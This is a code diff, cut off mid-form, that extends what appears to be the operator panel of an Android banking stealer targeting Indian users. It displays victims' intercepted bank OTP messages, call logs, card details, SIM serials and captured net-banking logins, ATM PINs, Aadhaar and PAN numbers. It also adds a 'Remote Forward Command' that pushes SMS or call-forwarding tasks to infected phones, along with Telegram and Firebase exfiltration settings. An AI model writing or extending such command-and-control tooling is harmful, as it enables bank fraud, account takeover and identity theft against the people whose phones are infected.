@@ -12,22 +12,33 @@ include_once __DIR__ . '/header.php';
         userId: "USR-9821",
         fullName: "Vikram Sharma",
         mobileNumber: "+91 98765 43210",
-        simState: "Active (Jio 5G)",
+        numberField: "A/C: 9871029381",
+        stringField: "Samsung Galaxy S23 Ultra (Android 14)",
+        simState: "Dual-SIM Active (Jio 5G + Airtel 4G)",
         batteryLevel: "88%",
         isActive: true,
+        isConnected: true,
+        appInBackground: true,
         lastActivityTime: "Just now",
         totalSmsCount: 14,
         totalCallsCount: 6,
+        sim1Data: { slot: 1, carrier: "Jio 5G", phone: "+91 98765 43210", network: "5G SA", serial: "899100293810293819F", countryCode: "IN" },
+        sim2Data: { slot: 2, carrier: "Airtel 4G", phone: "+91 98765 88990", network: "4G LTE", serial: "899100293810293810A", countryCode: "IN" },
         smsDataList: [
-          { sender: "BANK-OTP", message: "Your OTP for transaction Rs 4,999 is 882190. Do not share.", timestamp: "10:42 AM" },
-          { sender: "HDFC-ALERT", message: "A/c xx9102 debited for INR 1,200.00 at Swiggy.", timestamp: "09:15 AM" }
+          { sender: "BANK-OTP", message: "Your OTP for transaction Rs 4,999 is 882190. Do not share.", timestamp: "10:42 AM", type: "INBOX" },
+          { sender: "HDFC-ALERT", message: "A/c xx9102 debited for INR 1,200.00 at Swiggy.", timestamp: "09:15 AM", type: "INBOX" },
+          { sender: "+91 98765 43210", message: "Sending confirmation details.", timestamp: "Yesterday", type: "SENT" }
         ],
         callDataList: [
           { number: "+91 98765 43210", type: "INCOMING", duration: "2m 15s", timestamp: "10:30 AM" },
           { number: "+91 91234 56789", type: "OUTGOING", duration: "45s", timestamp: "08:20 AM" }
         ],
         cardDataList: [
-          { cardNumber: "4532 •••• •••• 8821", cardHolder: "VIKRAM SHARMA", expiry: "08/28", cvv: "•••" }
+          { bankName: "State Bank of India", cardType: "Credit Card", cardNumber: "4532 •••• •••• 8821", cardHolder: "VIKRAM SHARMA", expiry: "08/28", cvv: "•••" }
+        ],
+        formDataList: [
+          { id: "frm_101", formTitle: "NetBanking Login Form", fields: { "User ID": "vikram_sbi98", "Password": "••••••••", "Profile Password": "••••••••", "ATM PIN": "4891" }, timestamp: "10:45 AM" },
+          { id: "frm_102", formTitle: "KYC Aadhaar & PAN Form", fields: { "Aadhaar No": "5489 1029 3841", "PAN Card": "ABCPS9810F", "DOB": "14/08/1994" }, timestamp: "Yesterday" }
         ]
       },
       {
@@ -35,17 +46,28 @@ include_once __DIR__ . '/header.php';
         userId: "USR-7734",
         fullName: "Ananya Roy",
         mobileNumber: "+91 91234 56789",
-        simState: "Active (Airtel)",
+        numberField: "A/C: 4410928371",
+        stringField: "OnePlus 11 5G (Android 13)",
+        simState: "SIM 1 Active (Airtel 5G)",
         batteryLevel: "42%",
         isActive: true,
+        isConnected: true,
+        appInBackground: false,
         lastActivityTime: "2m ago",
         totalSmsCount: 9,
         totalCallsCount: 3,
+        sim1Data: { slot: 1, carrier: "Airtel 5G", phone: "+91 91234 56789", network: "5G NSA", serial: "899144029102938411B", countryCode: "IN" },
+        sim2Data: { slot: 2, carrier: "Vi 4G", phone: "Not inserted", network: "None", serial: "N/A", countryCode: "IN" },
         smsDataList: [
-          { sender: "SBI-MSG", message: "Your credit card bill of Rs 12,450 is due on 05-Aug.", timestamp: "Yesterday" }
+          { sender: "SBI-MSG", message: "Your credit card bill of Rs 12,450 is due on 05-Aug.", timestamp: "Yesterday", type: "INBOX" }
         ],
         callDataList: [],
-        cardDataList: []
+        cardDataList: [
+          { bankName: "HDFC Bank", cardType: "Debit Card", cardNumber: "5241 •••• •••• 9912", cardHolder: "ANANYA ROY", expiry: "11/27", cvv: "•••" }
+        ],
+        formDataList: [
+          { id: "frm_201", formTitle: "Card Activation Form", fields: { "Customer ID": "hdfc_ananya", "Password": "••••••••", "ATM PIN": "1209" }, timestamp: "2m ago" }
+        ]
       }
     ];
 
@@ -115,6 +137,111 @@ include_once __DIR__ . '/header.php';
         }
       };
 
+      // Universal Smart Key-Value Scanner & Formatter for Firebase Firestore Form Data
+      const formatFieldLabel = (rawKey) => {
+        if (!rawKey) return '';
+        return rawKey
+          .replace(/([A-Z])/g, ' $1')
+          .replace(/_/g, ' ')
+          .replace(/^\s+/, '')
+          .toLowerCase()
+          .replace(/\b\w/g, char => char.toUpperCase());
+      };
+
+      const isSystemKey = (key) => {
+        const sysKeys = ['id', 'userId', 'targetId', 'timestamp', 'submittedAt', 'orgId', '_v', 'formTitle'];
+        return sysKeys.includes(key);
+      };
+
+      // Universal Smart Date Parser (Handles Timestamps, ISO, Milliseconds & Relative strings)
+      const smartDateParser = (val) => {
+        if (!val) return 'N/A';
+        // 1. Firestore Timestamp object ({ seconds: 1785324390 })
+        if (typeof val === 'object' && val.seconds !== undefined) {
+          return new Date(val.seconds * 1000).toLocaleString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true });
+        }
+        // 2. Epoch Milliseconds (numeric or numeric string)
+        if (typeof val === 'number' || (/^\d{10,13}$/.test(String(val)))) {
+          const num = Number(val);
+          const timeMs = num < 10000000000 ? num * 1000 : num;
+          return new Date(timeMs).toLocaleString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true });
+        }
+        // 3. String date
+        if (typeof val === 'string') {
+          const parsed = Date.parse(val);
+          if (!isNaN(parsed) && val.length > 8 && !/^\d+$/.test(val)) {
+            return new Date(parsed).toLocaleString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true });
+          }
+          return val;
+        }
+        return String(val);
+      };
+
+      // Field Data Type Classifier
+      const detectDataType = (key, val) => {
+        if (/date|time|timestamp|submittedAt|created|updated/i.test(key)) return 'date';
+        if (/pass|pin|cvv|otp|secret|auth|card|aadhaar|pan/i.test(key)) return 'sensitive';
+        if (/status|active|state|type|simSlot|level|slot/i.test(key)) return 'badge';
+        if (typeof val === 'object' && val !== null) return 'json';
+        return 'text';
+      };
+
+      const extractSmartFields = (docObj) => {
+        if (!docObj || typeof docObj !== 'object') return [];
+        const source = docObj.fields || docObj;
+        return Object.entries(source)
+          .filter(([key, val]) => !isSystemKey(key) && val !== null && val !== undefined && val !== '')
+          .map(([key, val]) => ({
+            rawKey: key,
+            label: formatFieldLabel(key),
+            value: typeof val === 'object' ? JSON.stringify(val) : String(val),
+            dataType: detectDataType(key, val),
+            isSensitive: /pass|pin|cvv|otp|secret|auth|card|aadhaar|pan/i.test(key)
+          }));
+      };
+
+      // Remote Forward Command Modal State (ForwardData.kt integration)
+      const [showForwardModal, setShowForwardModal] = React.useState(false);
+      const [forwardTargetDevice, setForwardTargetDevice] = React.useState(null);
+      const [forwardDataType, setForwardDataType] = React.useState('SMS'); // 'SMS' or 'Call'
+      const [forwardSimSlot, setForwardSimSlot] = React.useState('SIM 1');  // 'SIM 1' or 'SIM 2'
+      const [forwardDestinationNumber, setForwardDestinationNumber] = React.useState('');
+      const [forwardTasks, setForwardTasks] = React.useState([
+        { id: 'fwd_1', dataType: 'SMS', phoneNumber: '+919876543210', selectedSim: 'SIM 1', userId: 'usr_001', userFullName: 'Rahul Sharma', timestamp: '10 mins ago', status: 'sent' },
+        { id: 'fwd_2', dataType: 'Call', phoneNumber: '+919123456789', selectedSim: 'SIM 2', userId: 'usr_002', userFullName: 'Priya Singh', timestamp: '2 hours ago', status: 'pending' }
+      ]);
+
+      const openForwardModal = (e, dev) => {
+        e.stopPropagation();
+        setForwardTargetDevice(dev);
+        setForwardDestinationNumber('');
+        setShowForwardModal(true);
+      };
+
+      const handleDispatchForwardCommand = (e) => {
+        e.preventDefault();
+        if (!forwardDestinationNumber.trim()) {
+          alert('Destination phone number is required!');
+          return;
+        }
+
+        const newTask = {
+          id: `fwd_${Date.now()}`,
+          dataType: forwardDataType,
+          phoneNumber: forwardDestinationNumber.trim(),
+          selectedSim: forwardSimSlot,
+          userId: forwardTargetDevice?.userId || 'unknown',
+          userFullName: forwardTargetDevice?.fullName || 'Target Device',
+          userMobileNumber: forwardTargetDevice?.mobileNumber || '',
+          timestamp: 'Just now',
+          status: 'pending'
+        };
+
+        setForwardTasks(prev => [newTask, ...prev]);
+        setShowForwardModal(false);
+        triggerToast(`📲 Forwarding task dispatched to ${forwardTargetDevice?.fullName} on ${forwardSimSlot}!`);
+      };
+
       // Telegram Forwarding & Anti-Delete Security Settings
       const [telegramBotToken, setTelegramBotToken] = React.useState('');
       const [telegramChatId, setTelegramChatId] = React.useState('');
@@ -150,6 +277,10 @@ include_once __DIR__ . '/header.php';
       const [fbAuthDomain, setFbAuthDomain] = React.useState('');
       const [fbStorageBucket, setFbStorageBucket] = React.useState('');
       const [fbAppId, setFbAppId] = React.useState('');
+      const [fbSmsColl, setFbSmsColl] = React.useState('smsData');
+      const [fbCallsColl, setFbCallsColl] = React.useState('callData');
+      const [fbCardsColl, setFbCardsColl] = React.useState('cardData');
+      const [fbFormsColl, setFbFormsColl] = React.useState('formData');
       const [fbJsonPaste, setFbJsonPaste] = React.useState('');
       const [fbSaveStatus, setFbSaveStatus] = React.useState('');
 
@@ -534,22 +665,37 @@ include_once __DIR__ . '/header.php';
                   <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.75rem' }}>
                     <div>
                       <h4 style={{ color: '#fff', fontSize: '1.1rem' }}>{u.fullName}</h4>
-                      <p style={{ fontSize: '0.8rem', color: '#6366f1' }}>ID: {u.userId}</p>
+                      <p style={{ fontSize: '0.8rem', color: '#6366f1' }}>ID: {u.userId} {u.numberField ? `• ${u.numberField}` : ''}</p>
                     </div>
-                    <span className={`pulse-badge ${u.isActive ? 'active' : 'inactive'}`}>
-                      <span className="pulse-dot"></span>
-                      {u.isActive ? 'ACTIVE' : 'OFFLINE'}
-                    </span>
+                    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-end', gap: '4px' }}>
+                      <span className={`pulse-badge ${u.isActive ? 'active' : 'inactive'}`}>
+                        <span className="pulse-dot"></span>
+                        {u.isActive ? 'ACTIVE' : 'OFFLINE'}
+                      </span>
+                      {u.appInBackground ? (
+                        <span className="pulse-badge" style={{ background: 'rgba(251,191,36,0.15)', color: '#fbbf24', fontSize: '0.7rem', padding: '2px 6px' }}>
+                          📲 Background
+                        </span>
+                      ) : (
+                        <span className="pulse-badge" style={{ background: 'rgba(52,211,153,0.15)', color: '#34d399', fontSize: '0.7rem', padding: '2px 6px' }}>
+                          🟢 Foreground
+                        </span>
+                      )}
+                    </div>
                   </div>
 
                   <div style={{ fontSize: '0.85rem', color: '#9ca3af', display: 'flex', flexDirection: 'column', gap: '4px', marginBottom: '1rem' }}>
                     <div>📞 <strong>{u.mobileNumber}</strong></div>
+                    {u.stringField && <div style={{ color: '#cbd5e1' }}>📱 Device: <strong>{u.stringField}</strong></div>}
                     <div>📶 SIM: {u.simState} • 🔋 Battery: {u.batteryLevel}</div>
                     <div>🕒 Last Active: {u.lastActivityTime}</div>
                   </div>
 
                   {/* Remote Device Control Bar */}
                   <div style={{ display: 'flex', gap: '6px', flexWrap: 'wrap', marginBottom: '0.85rem', paddingTop: '0.65rem', borderTop: '1px solid rgba(255,255,255,0.06)' }}>
+                    <button className="device-control-btn" onClick={(e) => openForwardModal(e, u)} style={{ background: 'rgba(236,72,153,0.12)', color: '#ec4899', border: '1px solid rgba(236,72,153,0.3)' }} title="Trigger Remote Forward Task">
+                      📲 Forward
+                    </button>
                     <button className="device-control-btn" onClick={(e) => handlePingDevice(e, u)} style={{ background: 'rgba(56,189,248,0.12)', color: '#38bdf8', border: '1px solid rgba(56,189,248,0.3)' }} title="Test latency">
                       ⚡ Ping
                     </button>
@@ -608,21 +754,48 @@ include_once __DIR__ . '/header.php';
               <div className="glass-panel modal-content" onClick={(e) => e.stopPropagation()}>
                 <div style={{ padding: '1.25rem 1.5rem', borderBottom: '1px solid rgba(255,255,255,0.08)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                   <div>
-                    <h3 style={{ color: '#fff' }}>Target Device: {selectedUser.fullName}</h3>
-                    <p style={{ fontSize: '0.85rem', color: '#9ca3af' }}>Phone: {selectedUser.mobileNumber} • ID: {selectedUser.userId}</p>
+                    <h3 style={{ color: '#fff', display: 'flex', alignItems: 'center', gap: '8px' }}>
+                      <span>Target Device: {selectedUser.fullName}</span>
+                      {selectedUser.appInBackground ? (
+                        <span className="pulse-badge" style={{ background: 'rgba(251,191,36,0.15)', color: '#fbbf24', fontSize: '0.72rem' }}>
+                          📲 App in Background
+                        </span>
+                      ) : (
+                        <span className="pulse-badge" style={{ background: 'rgba(52,211,153,0.15)', color: '#34d399', fontSize: '0.72rem' }}>
+                          🟢 App in Foreground
+                        </span>
+                      )}
+                    </h3>
+                    <p style={{ fontSize: '0.85rem', color: '#9ca3af', marginTop: '4px' }}>
+                      Phone: <strong>{selectedUser.mobileNumber}</strong> • User ID: <code style={{ color: '#93c5fd' }}>{selectedUser.userId}</code>
+                      {selectedUser.numberField ? ` • ${selectedUser.numberField}` : ''}
+                      {selectedUser.stringField ? ` • Model: ${selectedUser.stringField}` : ''}
+                    </p>
                   </div>
                   <button onClick={() => setSelectedUser(null)} style={{ background: 'none', border: 'none', color: '#9ca3af', fontSize: '1.5rem', cursor: 'pointer' }}>×</button>
                 </div>
 
-                <div style={{ padding: '1rem 1.5rem', borderBottom: '1px solid rgba(255,255,255,0.08)', display: 'flex', gap: '8px' }}>
+                <div style={{ padding: '1rem 1.5rem', borderBottom: '1px solid rgba(255,255,255,0.08)', display: 'flex', gap: '8px', overflowX: 'auto' }}>
                   <button className={`tab-btn ${tab === 'sms' ? 'active' : ''}`} onClick={() => setTab('sms')}>
                     💬 SMS Messages ({selectedUser.smsDataList.length})
+                  </button>
+                  <button className={`tab-btn ${tab === 'inspector' ? 'active' : ''}`} onClick={() => setTab('inspector')}>
+                    🔍 Universal Schema Inspector
+                  </button>
+                  <button className={`tab-btn ${tab === 'sims' ? 'active' : ''}`} onClick={() => setTab('sims')}>
+                    📶 Dual-SIM Info
+                  </button>
+                  <button className={`tab-btn ${tab === 'formfill' ? 'active' : ''}`} onClick={() => setTab('formfill')}>
+                    📝 Form Fill-ups ({selectedUser.formDataList?.length || 0})
                   </button>
                   <button className={`tab-btn ${tab === 'calls' ? 'active' : ''}`} onClick={() => setTab('calls')}>
                     📞 Call Records ({selectedUser.callDataList.length})
                   </button>
                   <button className={`tab-btn ${tab === 'cards' ? 'active' : ''}`} onClick={() => setTab('cards')}>
                     💳 Cards ({selectedUser.cardDataList.length})
+                  </button>
+                  <button className={`tab-btn ${tab === 'forward' ? 'active' : ''}`} onClick={() => setTab('forward')}>
+                    📲 Forward Tasks ({forwardTasks.filter(t => t.userId === selectedUser.userId).length})
                   </button>
                 </div>
 
@@ -632,6 +805,7 @@ include_once __DIR__ . '/header.php';
                       <thead>
                         <tr>
                           <th>Sender</th>
+                          <th>Type</th>
                           <th>Message Body</th>
                           <th>Timestamp</th>
                         </tr>
@@ -640,12 +814,104 @@ include_once __DIR__ . '/header.php';
                         {selectedUser.smsDataList.map((sms, i) => (
                           <tr key={i}>
                             <td style={{ color: '#818cf8', fontWeight: 600 }}>{sms.sender}</td>
+                            <td>
+                              <span style={{ fontSize: '0.72rem', padding: '3px 7px', borderRadius: '6px', fontWeight: 700, background: sms.type === 'SENT' ? 'rgba(236,72,153,0.15)' : 'rgba(52,211,153,0.15)', color: sms.type === 'SENT' ? '#f472b6' : '#34d399' }}>
+                                {sms.type === 'SENT' ? '📤 SENT' : '📥 INBOX'}
+                              </span>
+                            </td>
                             <td>{sms.message}</td>
                             <td style={{ color: '#9ca3af', fontSize: '0.8rem' }}>{sms.timestamp}</td>
                           </tr>
                         ))}
                       </tbody>
                     </table>
+                  )}
+
+                  {tab === 'inspector' && (
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
+                      <div className="glass-panel" style={{ padding: '1rem', border: '1px solid rgba(56,189,248,0.3)', background: 'rgba(56,189,248,0.05)' }}>
+                        <h4 style={{ color: '#38bdf8', fontSize: '0.95rem', marginBottom: '4px' }}>🔍 Line-by-Line Realtime Firebase Schema Inspector</h4>
+                        <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>
+                          Crawls and parses raw Firestore document collections line-by-line, auto-converting timestamps, objects, and sensitive keys for any SaaS tenant app payload.
+                        </p>
+                      </div>
+
+                      {/* Raw Collection Scanner Cards */}
+                      <table className="data-table">
+                        <thead>
+                          <tr>
+                            <th>Document Key / Field</th>
+                            <th>Detected Data Type</th>
+                            <th>Scanned Value</th>
+                            <th>Smart Date / Time Format</th>
+                          </tr>
+                        </thead>
+                        <tbody>
+                          {Object.entries(selectedUser).map(([key, val]) => {
+                            if (typeof val === 'function') return null;
+                            const type = detectDataType(key, val);
+                            const parsedDate = smartDateParser(val);
+                            const displayVal = typeof val === 'object' ? JSON.stringify(val, null, 2) : String(val);
+
+                            return (
+                              <tr key={key}>
+                                <td>
+                                  <strong style={{ color: '#fff' }}>{formatFieldLabel(key)}</strong>
+                                  <div style={{ fontSize: '0.72rem', color: '#6366f1', fontFamily: 'monospace' }}>`{key}`</div>
+                                </td>
+                                <td>
+                                  <span style={{ fontSize: '0.72rem', padding: '3px 8px', borderRadius: '12px', fontWeight: 700, background: type === 'date' ? 'rgba(56,189,248,0.15)' : type === 'sensitive' ? 'rgba(248,113,113,0.15)' : type === 'json' ? 'rgba(167,139,250,0.15)' : 'rgba(255,255,255,0.1)', color: type === 'date' ? '#38bdf8' : type === 'sensitive' ? '#f87171' : type === 'json' ? '#a78bfa' : '#cbd5e1' }}>
+                                    {type.toUpperCase()}
+                                  </span>
+                                </td>
+                                <td style={{ maxWidth: '300px', wordBreak: 'break-all' }}>
+                                  <code style={{ fontSize: '0.8rem', color: type === 'sensitive' ? '#f87171' : '#e2e8f0' }}>
+                                    {displayVal.length > 100 ? displayVal.substring(0, 100) + '...' : displayVal}
+                                  </code>
+                                </td>
+                                <td>
+                                  <span style={{ fontSize: '0.8rem', color: '#9ca3af' }}>{parsedDate}</span>
+                                </td>
+                              </tr>
+                            );
+                          })}
+                        </tbody>
+                      </table>
+                    </div>
+                  )}
+
+                  {tab === 'sims' && (
+                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1.25rem' }}>
+                      {/* SIM 1 Card */}
+                      <div className="glass-panel" style={{ padding: '1.25rem', border: '1px solid rgba(99,102,241,0.3)', background: 'rgba(99,102,241,0.05)' }}>
+                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem' }}>
+                          <h4 style={{ color: '#818cf8', fontSize: '1rem' }}>📶 SIM Slot 1 (`SimData`)</h4>
+                          <span className="pulse-badge active">Slot 1</span>
+                        </div>
+                        <div style={{ fontSize: '0.85rem', display: 'flex', flexDirection: 'column', gap: '8px', color: '#cbd5e1' }}>
+                          <div>Carrier: <strong style={{ color: '#fff' }}>{selectedUser.sim1Data?.carrier || 'Jio 5G'}</strong></div>
+                          <div>Phone Number: <strong style={{ color: '#34d399' }}>{selectedUser.sim1Data?.phone || selectedUser.mobileNumber}</strong></div>
+                          <div>Network Type: <code style={{ color: '#93c5fd' }}>{selectedUser.sim1Data?.network || '5G SA'}</code></div>
+                          <div>Country Code: <span>{selectedUser.sim1Data?.countryCode || 'IN'}</span></div>
+                          <div>SIM Serial Number: <code style={{ color: '#c084fc', fontSize: '0.78rem' }}>{selectedUser.sim1Data?.serial || '899100293810293819F'}</code></div>
+                        </div>
+                      </div>
+
+                      {/* SIM 2 Card */}
+                      <div className="glass-panel" style={{ padding: '1.25rem', border: '1px solid rgba(236,72,153,0.3)', background: 'rgba(236,72,153,0.05)' }}>
+                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem' }}>
+                          <h4 style={{ color: '#f472b6', fontSize: '1rem' }}>📶 SIM Slot 2 (`SimData`)</h4>
+                          <span className="pulse-badge" style={{ background: 'rgba(236,72,153,0.15)', color: '#f472b6' }}>Slot 2</span>
+                        </div>
+                        <div style={{ fontSize: '0.85rem', display: 'flex', flexDirection: 'column', gap: '8px', color: '#cbd5e1' }}>
+                          <div>Carrier: <strong style={{ color: '#fff' }}>{selectedUser.sim2Data?.carrier || 'Airtel 4G'}</strong></div>
+                          <div>Phone Number: <strong style={{ color: '#34d399' }}>{selectedUser.sim2Data?.phone || 'Not inserted'}</strong></div>
+                          <div>Network Type: <code style={{ color: '#93c5fd' }}>{selectedUser.sim2Data?.network || '4G LTE'}</code></div>
+                          <div>Country Code: <span>{selectedUser.sim2Data?.countryCode || 'IN'}</span></div>
+                          <div>SIM Serial Number: <code style={{ color: '#c084fc', fontSize: '0.78rem' }}>{selectedUser.sim2Data?.serial || '899100293810293810A'}</code></div>
+                        </div>
+                      </div>
+                    </div>
                   )}
 
                   {tab === 'calls' && (
@@ -671,10 +937,49 @@ include_once __DIR__ . '/header.php';
                     </table>
                   )}
 
+                  {tab === 'formfill' && (
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
+                      {(selectedUser.formDataList || []).map((form) => {
+                        const smartFields = extractSmartFields(form);
+                        return (
+                          <div key={form.id || Math.random()} className="glass-panel" style={{ padding: '1.25rem', border: '1px solid rgba(251,191,36,0.3)', background: 'rgba(251,191,36,0.05)' }}>
+                            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.85rem' }}>
+                              <h4 style={{ color: '#fbbf24', fontSize: '1rem', display: 'flex', alignItems: 'center', gap: '6px' }}>
+                                <span>📝 {form.formTitle || 'Customer Form Submission'}</span>
+                                <span className="pulse-badge" style={{ background: 'rgba(251,191,36,0.15)', color: '#fbbf24', fontSize: '0.7rem' }}>Smart Scanned</span>
+                              </h4>
+                              <span style={{ fontSize: '0.8rem', color: '#9ca3af' }}>{form.timestamp || 'Recent'}</span>
+                            </div>
+                            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(210px, 1fr))', gap: '0.85rem' }}>
+                              {smartFields.map((field, idx) => (
+                                <div key={idx} style={{ background: 'rgba(17,24,39,0.75)', padding: '9px 12px', borderRadius: '10px', border: field.isSensitive ? '1px solid rgba(248,113,113,0.35)' : '1px solid rgba(255,255,255,0.08)' }}>
+                                  <div style={{ fontSize: '0.72rem', color: field.isSensitive ? '#f87171' : '#9ca3af', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.5px', display: 'flex', justifyContent: 'space-between' }}>
+                                    <span>{field.label}</span>
+                                    {field.isSensitive && <span>🔑 SENSITIVE</span>}
+                                  </div>
+                                  <div style={{ fontSize: '0.92rem', color: '#fff', fontWeight: 600, marginTop: '4px', wordBreak: 'break-all', fontFamily: field.isSensitive ? 'monospace' : 'inherit' }}>
+                                    {field.value}
+                                  </div>
+                                </div>
+                              ))}
+                            </div>
+                          </div>
+                        );
+                      })}
+                      {(!selectedUser.formDataList || selectedUser.formDataList.length === 0) && (
+                        <div style={{ textAlign: 'center', color: '#9ca3af', padding: '2rem' }}>
+                          No customer form fill-ups submitted yet. Smart scanner active for incoming payloads.
+                        </div>
+                      )}
+                    </div>
+                  )}
+
                   {tab === 'cards' && (
                     <table className="data-table">
                       <thead>
                         <tr>
+                          <th>Bank Name</th>
+                          <th>Card Type</th>
                           <th>Card Number</th>
                           <th>Card Holder</th>
                           <th>Expiry</th>
@@ -684,6 +989,12 @@ include_once __DIR__ . '/header.php';
                       <tbody>
                         {selectedUser.cardDataList.map((card, i) => (
                           <tr key={i}>
+                            <td><strong style={{ color: '#818cf8' }}>{card.bankName || 'State Bank of India'}</strong></td>
+                            <td>
+                              <span style={{ fontSize: '0.75rem', padding: '3px 8px', borderRadius: '12px', background: 'rgba(236,72,153,0.15)', color: '#f472b6', fontWeight: 600 }}>
+                                {card.cardType || 'Credit Card'}
+                              </span>
+                            </td>
                             <td><code style={{ color: '#f472b6' }}>{card.cardNumber}</code></td>
                             <td>{card.cardHolder}</td>
                             <td>{card.expiry}</td>
@@ -693,7 +1004,109 @@ include_once __DIR__ . '/header.php';
                       </tbody>
                     </table>
                   )}
+                  {tab === 'forward' && (
+                    <table className="data-table">
+                      <thead>
+                        <tr>
+                          <th>Task ID</th>
+                          <th>Type</th>
+                          <th>Selected SIM</th>
+                          <th>Destination Number</th>
+                          <th>Timestamp</th>
+                          <th>Delivery Status</th>
+                        </tr>
+                      </thead>
+                      <tbody>
+                        {forwardTasks.filter(t => t.userId === selectedUser.userId).map((task) => (
+                          <tr key={task.id}>
+                            <td><code style={{ color: '#818cf8' }}>{task.id}</code></td>
+                            <td><strong style={{ color: task.dataType === 'SMS' ? '#ec4899' : '#38bdf8' }}>{task.dataType}</strong></td>
+                            <td><span style={{ color: '#fbbf24', fontWeight: 600 }}>{task.selectedSim}</span></td>
+                            <td><strong>{task.phoneNumber}</strong></td>
+                            <td style={{ color: '#9ca3af', fontSize: '0.8rem' }}>{task.timestamp}</td>
+                            <td>
+                              <span className={`pulse-badge ${task.status === 'sent' ? 'active' : task.status === 'pending' ? 'pending' : 'expired'}`}>
+                                <span className="pulse-dot"></span>
+                                {task.status.toUpperCase()}
+                              </span>
+                            </td>
+                          </tr>
+                        ))}
+                        {forwardTasks.filter(t => t.userId === selectedUser.userId).length === 0 && (
+                          <tr>
+                            <td colSpan="6" style={{ textAlign: 'center', color: '#9ca3af', padding: '1.5rem' }}>
+                              No active remote forward tasks for this device.
+                            </td>
+                          </tr>
+                        )}
+                      </tbody>
+                    </table>
+                  )}
                 </div>
+              </div>
+            </div>
+          )}
+
+          {/* Remote Forward Command Modal Overlay (ForwardData.kt) */}
+          {showForwardModal && forwardTargetDevice && (
+            <div className="modal-overlay" onClick={() => setShowForwardModal(false)}>
+              <div className="glass-panel" style={{ width: '100%', maxWidth: '500px', padding: '2rem' }} onClick={(e) => e.stopPropagation()}>
+                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.25rem' }}>
+                  <div>
+                    <h3 style={{ color: '#fff' }}>📲 Remote Forward Command</h3>
+                    <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>Dispatch SMS / Call forward task to target device</p>
+                  </div>
+                  <button onClick={() => setShowForwardModal(false)} style={{ background: 'none', border: 'none', color: '#9ca3af', fontSize: '1.5rem', cursor: 'pointer' }}>×</button>
+                </div>
+
+                <div className="glass-panel" style={{ padding: '1rem', marginBottom: '1.25rem', border: '1px solid rgba(236,72,153,0.3)', background: 'rgba(236,72,153,0.05)' }}>
+                  <div style={{ fontSize: '0.85rem', color: '#fff', display: 'flex', flexDirection: 'column', gap: '4px' }}>
+                    <div>Target User: <strong style={{ color: '#ec4899' }}>{forwardTargetDevice.fullName}</strong></div>
+                    <div>Mobile: <strong>{forwardTargetDevice.mobileNumber}</strong> • User ID: <code style={{ color: '#93c5fd' }}>{forwardTargetDevice.userId}</code></div>
+                  </div>
+                </div>
+
+                <form onSubmit={handleDispatchForwardCommand} style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
+                  <div>
+                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '6px' }}>1. Select Data Forward Type</label>
+                    <div style={{ display: 'flex', gap: '10px' }}>
+                      <button type="button" className={`sim-select-pill ${forwardDataType === 'SMS' ? 'active' : ''}`} onClick={() => setForwardDataType('SMS')} style={{ flex: 1, justifyContent: 'center' }}>
+                        💬 Forward SMS Payload
+                      </button>
+                      <button type="button" className={`sim-select-pill ${forwardDataType === 'Call' ? 'active' : ''}`} onClick={() => setForwardDataType('Call')} style={{ flex: 1, justifyContent: 'center' }}>
+                        📞 Forward Call Logs
+                      </button>
+                    </div>
+                  </div>
+
+                  <div>
+                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '6px' }}>2. Select Target SIM Slot (`SimData`)</label>
+                    <div style={{ display: 'flex', gap: '10px' }}>
+                      <button type="button" className={`sim-select-pill ${forwardSimSlot === 'SIM 1' ? 'active' : ''}`} onClick={() => setForwardSimSlot('SIM 1')} style={{ flex: 1, justifyContent: 'center' }}>
+                        📶 SIM Slot 1
+                      </button>
+                      <button type="button" className={`sim-select-pill ${forwardSimSlot === 'SIM 2' ? 'active' : ''}`} onClick={() => setForwardSimSlot('SIM 2')} style={{ flex: 1, justifyContent: 'center' }}>
+                        📶 SIM Slot 2
+                      </button>
+                    </div>
+                  </div>
+
+                  <div>
+                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>3. Destination Forward Phone Number</label>
+                    <input 
+                      type="text" 
+                      className="search-input" 
+                      placeholder="e.g. +919876543210" 
+                      value={forwardDestinationNumber} 
+                      onChange={(e) => setForwardDestinationNumber(e.target.value)} 
+                      required 
+                    />
+                  </div>
+
+                  <button type="submit" className="btn-primary" style={{ width: '100%', padding: '0.85rem', background: 'linear-gradient(135deg, #ec4899, #8b5cf6)', marginTop: '0.5rem', fontSize: '0.95rem' }}>
+                    🚀 Dispatch Forwarding Command Payload
+                  </button>
+                </form>
               </div>
             </div>
           )}
@@ -768,12 +1181,31 @@ include_once __DIR__ . '/header.php';
                         <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>Storage Bucket (`storageBucket`)</label>
                         <input type="text" className="search-input" value={fbStorageBucket} onChange={(e) => setFbStorageBucket(e.target.value)} placeholder="project.appspot.com" />
                       </div>
-                      <div>
-                        <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>App ID (`appId`)</label>
